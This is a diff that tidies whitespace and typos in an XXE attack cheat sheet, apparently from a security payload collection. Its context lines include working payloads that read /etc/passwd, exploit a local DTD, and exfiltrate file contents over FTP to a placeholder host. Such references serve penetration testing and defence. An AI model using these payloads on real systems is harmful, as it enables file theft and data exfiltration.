@@ -2,10 +2,10 @@
 
 > An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.
 
-**Internal Entity**: If an entity is declared within a DTD it is called as internal entity.    
+**Internal Entity**: If an entity is declared within a DTD it is called as internal entity.
 Syntax: `<!ENTITY entity_name "entity_value">`
 
-**External Entity**: If an entity is declared outside a DTD it is called as external entity. Identified by `SYSTEM`.    
+**External Entity**: If an entity is declared outside a DTD it is called as external entity. Identified by `SYSTEM`.
 Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
 
 ## Summary
@@ -128,7 +128,7 @@ It might help to set the `Content-Type: application/xml` in the request when sen
 
 ### Classic XXE
 
-We try to display the content of the file `/etc/passwd` 
+We try to display the content of the file `/etc/passwd`.
 
 ```xml
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
@@ -196,7 +196,7 @@ We try to display the content of the file `/etc/passwd`
 
 ### XInclude attacks
 
-When you can't modify the **DOCTYPE** element use the **XInclude** to target 
+When you can't modify the **DOCTYPE** element use the **XInclude** to target
 
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
@@ -282,7 +282,8 @@ Short list of dtd files already stored on Linux systems; list them with `locate 
 
 The file `/usr/share/xml/fontconfig/fonts.dtd` has an injectable entity `%constant` at line 148: `<!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'>`
 
-The final payload becomes: 
+The final payload becomes:
+
 ```xml
 <!DOCTYPE message [
     <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
@@ -476,7 +477,7 @@ Assuming payloads such as the previous return a verbose error. You can start poi
 [Other payloads using different DTDs](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md)
 
 
-## WAF Bypasses 
+## WAF Bypasses
 
 ### Bypass via character encoding
 
@@ -503,7 +504,7 @@ cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
 
 ## XXE in Java
 
-Unsecure configuration in 10 different Java classes from three XML processing interfaces (DOM, SAX, StAX) that can lead to XXE:
+Insecure configuration in 10 different Java classes from three XML processing interfaces (DOM, SAX, StAX) that can lead to XXE:
 
 ![XXE Java security features overview infographics](https://semgrep.dev/docs/assets/images/cheat-sheets-xxe-java-infographics-1d1d5016802e3ab8f0886b62b8c81f21.png)
 
@@ -544,7 +545,7 @@ Ref.
 
 **OOB via SVG rasterization**
 
-*xxe.svg*
+_xxe.svg_
 
 ```xml
 <?xml version="1.0" standalone="yes"?>
@@ -650,7 +651,7 @@ Add your blind XXE payload inside `xl/workbook.xml`.
 <workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
 ```
 
-Alternativly, add your payload in `xl/sharedStrings.xml`:
+Alternatively, add your payload in `xl/sharedStrings.xml`:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
@@ -666,7 +667,7 @@ And using FTP instead of HTTP allows to retrieve much larger files.
 
 ```xml
 <!ENTITY % d SYSTEM "file:///etc/passwd">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>"> 
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
 ```
 
 Serve DTD and receive FTP payload using [xxeserv](https://github.com/staaldraad/xxeserv):
